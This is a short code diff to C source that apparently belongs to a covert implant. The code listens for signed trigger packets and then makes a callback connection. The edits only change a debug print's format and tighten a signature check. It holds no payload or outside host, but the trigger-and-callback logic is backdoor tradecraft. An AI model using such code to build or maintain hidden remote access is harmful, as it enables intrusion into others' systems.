@@ -144,7 +144,7 @@ void* start_triggered_connect( void *param )
 		printf("\t   Callback Port: %i\n", tParams.callback_port);
 //		printf("\t    Trigger Port: %i\n", tParams.trigger_port);
 //		printf("\t     ID Key Hash: \t");
-		displaySha1Hash("ID Key Hash: ", tParams.idKey_hash);
+		displaySha1Hash("\t     ID Key Hash: ", tParams.idKey_hash);
 //		for (i = 0; i < ID_KEY_HASH_SIZE; i++)
 //			printf("%c", tParams.idKey_hash[i]);
 		printf("\n");
@@ -255,7 +255,7 @@ int TriggerListen( char *iface, int trigger_delay, unsigned long delete_delay )
 #endif
 		else
 		{
-			if ( dt_signature_check( packet_buffer, packet_length, &recvd_payload) != FAILURE )
+			if ( dt_signature_check( packet_buffer, packet_length, &recvd_payload) == SUCCESS )
 			{
 				unsigned char	recvdKey[ID_KEY_HASH_SIZE];
 
